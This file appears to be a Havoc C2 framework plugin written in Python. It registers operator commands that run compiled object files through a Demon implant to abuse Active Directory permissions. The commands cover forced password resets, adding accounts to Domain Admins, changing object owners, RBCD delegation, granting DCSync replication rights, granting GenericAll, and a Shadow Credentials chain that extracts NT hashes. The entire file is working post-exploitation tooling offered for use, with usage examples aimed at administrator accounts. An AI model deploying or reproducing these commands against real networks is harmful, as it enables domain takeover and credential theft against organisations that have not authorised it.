from havoc import Demon, RegisterCommand
from struct import pack, calcsize


# =============================================================================
#
#   acl-abuse-havoc
#   AD ACL abuse via inline LDAP and Kerberos
#   github.com/DeepMalware/acl-abuse-havoc
#
#   Commands:
#     acl-fcp          ForceChangePassword
#     acl-addmember    AddGroupMember
#     acl-owner        SetOwner
#     acl-rbcd         Resource-Based Constrained Delegation
#     acl-dcsync       Grant DCSync rights
#     acl-genericall   Grant GenericAll
#     acl-shadow       Shadow Credentials + UnPAC-the-hash
#
# =============================================================================


BOF_DIR = "bin"


# =============================================================================
#  Packer — argument serialization for BOF execution
# =============================================================================

class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size:   int   = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size   += calcsize(fmt)

    def adduint32(self, n):
        fmt = '<I'
        self.buffer += pack(fmt, n)
        self.size   += calcsize(fmt)


# =============================================================================
#  Helpers
# =============================================================================

def bof(name, arch):
    return f"{BOF_DIR}/{name}.{arch}.o"

def dc(params, index):
    return params[index] if len(params) > index else ""


# =============================================================================
#  acl-fcp — ForceChangePassword
#
#  Requires LDAPS. Runs as the current demon context.
#
#  BOF args: userIdentifier, isUserDN, newPassword, oldPassword,
#            searchOu, dcAddress, useLdaps
#
#  Usage: acl-fcp <user> <newpassword> [dc_address]
# =============================================================================

def acl_forcechangepassword(demonID, *params):
    demon = Demon(demonID)

    if len(params) < 2 or len(params) > 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: acl-fcp user newpassword [dc_address]")
        return False

    packer = Packer()
    packer.addstr(params[0])      # userIdentifier
    packer.adduint32(0)           # isUserDN       — resolve by sAMAccountName
    packer.addstr(params[1])      # newPassword
    packer.addstr("")             # oldPassword    — empty = admin reset
    packer.addstr("")             # searchOu       — empty = defaultNamingContext
    packer.addstr(dc(params, 2))  # dcAddress      — empty = auto-discover
    packer.adduint32(1)           # useLdaps       — required for unicodePwd

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"[acl-fcp] ForceChangePassword -> {params[0]}")
    demon.InlineExecute(TaskID, "go",
        bof("set-password", demon.ProcessArch),
        packer.getbuffer(), False)
    return TaskID


# =============================================================================
#  acl-addmember — AddGroupMember
#
#  Abuses WriteMembers or GenericAll. Standard LDAP.
#
#  BOF args: groupIdentifier, isGroupDN, memberIdentifier, isMemberDN,
#            searchOu, dcAddress, useLdaps
#
#  Usage: acl-addmember <group> <user> [dc_address]
# =============================================================================

def acl_addmember(demonID, *params):
    demon = Demon(demonID)

    if len(params) < 2 or len(params) > 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: acl-addmember group user [dc_address]")
        return False

    packer = Packer()
    packer.addstr(params[0])      # groupIdentifier
    packer.adduint32(0)           # isGroupDN
    packer.addstr(params[1])      # memberIdentifier
    packer.adduint32(0)           # isMemberDN
    packer.addstr("")             # searchOu
    packer.addstr(dc(params, 2))  # dcAddress
    packer.adduint32(0)           # useLdaps

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"[acl-addmember] AddGroupMember {params[1]} -> {params[0]}")
    demon.InlineExecute(TaskID, "go",
        bof("add-groupmember", demon.ProcessArch),
        packer.getbuffer(), False)
    return TaskID


# =============================================================================
#  acl-owner — SetOwner
#
#  Abuses WriteOwner. Changing ownership implicitly grants WriteDACL.
#  Requires LDAPS.
#
#  BOF args: targetIdentifier, isTargetDN, ownerIdentifier, isOwnerDN,
#            searchOu, dcAddress, useLdaps
#
#  Usage: acl-owner <target> <new_owner> [dc_address]
# =============================================================================

def acl_setowner(demonID, *params):
    demon = Demon(demonID)

    if len(params) < 2 or len(params) > 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: acl-owner target new_owner [dc_address]")
        return False

    packer = Packer()
    packer.addstr(params[0])      # targetIdentifier
    packer.adduint32(0)           # isTargetDN
    packer.addstr(params[1])      # ownerIdentifier
    packer.adduint32(0)           # isOwnerDN
    packer.addstr("")             # searchOu
    packer.addstr(dc(params, 2))  # dcAddress
    packer.adduint32(1)           # useLdaps

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"[acl-owner] SetOwner {params[1]} -> {params[0]}")
    demon.InlineExecute(TaskID, "go",
        bof("set-owner", demon.ProcessArch),
        packer.getbuffer(), False)
    return TaskID


# =============================================================================
#  acl-rbcd — AddRBCD
#
#  Writes msDS-AllowedToActOnBehalfOfOtherIdentity on a computer object.
#  Requires GenericWrite or equivalent. Standard LDAP.
#
#  BOF args: targetIdentifier, isTargetDN, principalIdentifier, isPrincipalDN,
#            searchOu, dcAddress, useLdaps
#
#  Usage: acl-rbcd <target_computer> <controlled_principal> [dc_address]
# =============================================================================

def acl_rbcd(demonID, *params):
    demon = Demon(demonID)

    if len(params) < 2 or len(params) > 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: acl-rbcd target_computer controlled_principal [dc_address]")
        return False

    packer = Packer()
    packer.addstr(params[0])      # targetIdentifier
    packer.adduint32(0)           # isTargetDN
    packer.addstr(params[1])      # principalIdentifier
    packer.adduint32(0)           # isPrincipalDN
    packer.addstr("")             # searchOu
    packer.addstr(dc(params, 2))  # dcAddress
    packer.adduint32(0)           # useLdaps

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"[acl-rbcd] AddRBCD {params[1]} -> {params[0]}")
    demon.InlineExecute(TaskID, "go",
        bof("add-rbcd", demon.ProcessArch),
        packer.getbuffer(), False)
    return TaskID


# =============================================================================
#  acl-dcsync — Grant DCSync Rights
#
#  Adds DS-Replication-Get-Changes and DS-Replication-Get-Changes-All ACEs
#  to the domain object. Requires WriteDACL on the domain. Standard LDAP.
#  The "dcsync" keyword is handled internally by the BOF.
#
#  BOF args: targetIdentifier, isTargetDN, trusteeIdentifier, isTrusteeDN,
#            accessMaskStr, aceTypeStr, aceFlagsStr,
#            objectTypeGuidStr, inheritedObjectTypeGuidStr,
#            searchOu, dcAddress, useLdaps
#
#  Usage: acl-dcsync "DC=domain,DC=local" <user> [dc_address]
# =============================================================================

def acl_dcsync(demonID, *params):
    demon = Demon(demonID)

    if len(params) < 2 or len(params) > 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            'Usage: acl-dcsync "DC=domain,DC=local" user [dc_address]')
        return False

    packer = Packer()
    packer.addstr(params[0])      # targetIdentifier — domain DN
    packer.adduint32(1)           # isTargetDN       — always a DN
    packer.addstr(params[1])      # trusteeIdentifier
    packer.adduint32(0)           # isTrusteeDN
    packer.addstr("dcsync")       # accessMaskStr    — triggers DCSync path in BOF
    packer.addstr("")             # aceTypeStr       — defaults to Allow
    packer.addstr("")             # aceFlagsStr      — no inheritance
    packer.addstr("")             # objectTypeGuidStr
    packer.addstr("")             # inheritedObjectTypeGuidStr
    packer.addstr("")             # searchOu
    packer.addstr(dc(params, 2))  # dcAddress
    packer.adduint32(0)           # useLdaps

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"[acl-dcsync] GrantDCSync {params[1]} on {params[0]}")
    demon.InlineExecute(TaskID, "go",
        bof("add-ace", demon.ProcessArch),
        packer.getbuffer(), False)
    return TaskID


# =============================================================================
#  acl-genericall — Grant GenericAll
#
#  Adds a GenericAll ACE on the target object. Requires WriteDACL.
#  Standard LDAP. Uses the same BOF as acl-dcsync.
#
#  BOF args: same as acl-dcsync
#
#  Usage: acl-genericall <target> <user> [dc_address]
# =============================================================================

def acl_genericall(demonID, *params):
    demon = Demon(demonID)

    if len(params) < 2 or len(params) > 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: acl-genericall target user [dc_address]")
        return False

    packer = Packer()
    packer.addstr(params[0])      # targetIdentifier
    packer.adduint32(0)           # isTargetDN
    packer.addstr(params[1])      # trusteeIdentifier
    packer.adduint32(0)           # isTrusteeDN
    packer.addstr("genericall")   # accessMaskStr — maps to GENERIC_ALL
    packer.addstr("")             # aceTypeStr
    packer.addstr("")             # aceFlagsStr
    packer.addstr("")             # objectTypeGuidStr
    packer.addstr("")             # inheritedObjectTypeGuidStr
    packer.addstr("")             # searchOu
    packer.addstr(dc(params, 2))  # dcAddress
    packer.adduint32(0)           # useLdaps

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"[acl-genericall] GrantGenericAll {params[1]} -> {params[0]}")
    demon.InlineExecute(TaskID, "go",
        bof("add-ace", demon.ProcessArch),
        packer.getbuffer(), False)
    return TaskID


# =============================================================================
#  acl-shadow — Shadow Credentials + UnPAC-the-hash
#
#  Full inline attack chain:
#    1. Generates RSA keypair and self-signed certificate
#    2. Writes msDS-KeyCredentialLink on the target via LDAP
#    3. Authenticates via PKINIT using the generated certificate
#    4. Extracts NT hash via UnPAC-the-hash
#    5. Removes the KeyCredential from the target
#
#  Requires GenericWrite or GenericAll on the target.
#  Requires AD CS and PKINIT enabled on the DC (Windows Server 2016+).
#
#  BOF args: target, domain, kdc
#
#  Usage: acl-shadow <target> <domain> [kdc]
# =============================================================================

def acl_shadowcredentials(demonID, *params):
    demon = Demon(demonID)

    if len(params) < 2 or len(params) > 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: acl-shadow target domain [kdc]")
        return False

    packer = Packer()
    packer.addstr(params[0])      # target
    packer.addstr(params[1])      # domain
    packer.addstr(dc(params, 2))  # kdc — empty = auto-discover

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"[acl-shadow] ShadowCredentials -> {params[0]}@{params[1]}")
    demon.InlineExecute(TaskID, "go",
        bof("add-shadowcredentials", demon.ProcessArch),
        packer.getbuffer(), False)
    return TaskID


# =============================================================================
#  Register commands
# =============================================================================

RegisterCommand(
    acl_forcechangepassword, "",
    "acl-fcp",
    "Force change an AD user password (admin reset via LDAPS)",
    0,
    "acl-fcp user newpassword [dc_address]",
    "acl-fcp jsmith Password123!"
)

RegisterCommand(
    acl_addmember, "",
    "acl-addmember",
    "Add a user to an AD group (abuses WriteMembers or GenericAll)",
    0,
    "acl-addmember group user [dc_address]",
    'acl-addmember "Domain Admins" jsmith'
)

RegisterCommand(
    acl_setowner, "",
    "acl-owner",
    "Change the owner of an AD object (abuses WriteOwner)",
    0,
    "acl-owner target new_owner [dc_address]",
    "acl-owner jsmith attacker"
)

RegisterCommand(
    acl_rbcd, "",
    "acl-rbcd",
    "Configure Resource-Based Constrained Delegation on a computer object",
    0,
    "acl-rbcd target_computer controlled_principal [dc_address]",
    "acl-rbcd WS01$ attacker$"
)

RegisterCommand(
    acl_dcsync, "",
    "acl-dcsync",
    "Grant DCSync rights to a principal on the domain object (abuses WriteDACL)",
    0,
    'acl-dcsync "DC=domain,DC=local" user [dc_address]',
    'acl-dcsync "DC=vuln,DC=local" jsmith'
)

RegisterCommand(
    acl_genericall, "",
    "acl-genericall",
    "Grant GenericAll on a target AD object (abuses WriteDACL)",
    0,
    "acl-genericall target user [dc_address]",
    "acl-genericall jsmith attacker"
)

RegisterCommand(
    acl_shadowcredentials, "",
    "acl-shadow",
    "Shadow Credentials attack - writes msDS-KeyCredentialLink, authenticates via PKINIT, extracts NT hash inline",
    0,
    "acl-shadow target domain [kdc]",
    "acl-shadow Administrator vuln.local"
)